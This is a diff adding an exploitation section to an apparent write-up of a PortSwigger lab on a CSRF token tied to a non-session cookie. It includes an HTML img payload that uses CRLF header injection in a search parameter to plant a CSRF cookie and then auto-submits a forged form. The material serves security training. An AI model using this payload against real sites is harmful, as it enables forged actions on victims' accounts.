@@ -16,5 +16,15 @@ ____
 ```
 1. Submit an invalid CSRF token.
 2. Submit a valid CSRF token from another user.
-3. Submit a valid CSRF token and CSRF cookie.
+3. Submit a valid CSRF token and CSRF cookie from another user.
+```
+### Exploitation
+To exploit this CSRF token+cookie mechanism, we need to perform 2 things.
+```
+1. Inject a CSRF cookie in user's session. (HTTP Header injection)
+2. Send a CSRF attack to victim.
+```
+#### Exploit
+```html
+<img src="https://0af7004304328f1781682fd800e00094.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=LUFzz00Z938R7C5KrosyX9BUHANvsix7" onerror="document.forms[0].submit()">
 ```
